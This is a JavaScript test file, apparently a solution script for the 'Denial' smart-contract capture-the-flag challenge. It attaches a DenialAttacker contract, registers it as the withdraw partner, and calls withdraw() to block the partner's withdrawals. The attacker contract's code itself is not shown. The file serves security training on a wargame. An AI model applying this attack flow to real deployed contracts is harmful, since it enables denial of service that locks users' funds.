const { ethers } = require("hardhat")
const { BigNumber, Contract, Signer } = require("ethers");
const { expect, assert } = require("chai")

describe.skip("Denial challenge", function () {
    const challengeAddress = '0x07916323b406A224baFeCB7a8FffaD0D53b2d496';
    const attackerAddress = '0xBff95cB92996488897361b51F45247C4565187a4';
    let accounts;
    let player;
    let challenge, attacker;

    beforeEach(async function () {
        accounts = await ethers.getSigners();
        player = accounts[0];

        const challengeFactory = await ethers.getContractFactory('Denial');
        challenge = await challengeFactory.attach(challengeAddress);
        assert.isNotNull(challenge, `Could not get Denial for ${challengeAddress}.`)

        assert.equal(await player.getAddress(), '0xe5e00c76DB49E2aB2294b19dDb3145C8975cF8a2',
            `Address at first account (${player.address}) is not correct.`);

        const attackerFactory = await ethers.getContractFactory('DenialAttacker');
        if(attackerAddress) {
            attacker = await attackerFactory.attach(attackerAddress);
            console.log(`Retrieved DenialAttacker from address = ${attacker.address}`);
        } else {
            attacker = await attackerFactory.deploy();
            console.log(`DenialAttacker deployed to address = ${attacker.address}`);
        }
        assert.isNotNull(attacker, `Failed to get DenialAttacker instance.`);
    });

    it("prevents partner from withdrawing", async function () {
        const partnerAddress = await challenge.partner();
        let txn = null;
        if (partnerAddress !== attacker.address) {
            assert.isNotNull(attacker.address);
            txn = await challenge.setWithdrawPartner(attacker.address);
            txn.wait();
            assert.isNotNull(txn.hash);
            console.log(`setWithdrawPartner() txnHash = ${txn.hash}`);
        }
        assert.equal(attacker.address, partnerAddress);

        txn = await challenge.withdraw();
        txn.wait();
        console.log(`withdraw() txnHash = ${txn.hash}`);
    });
});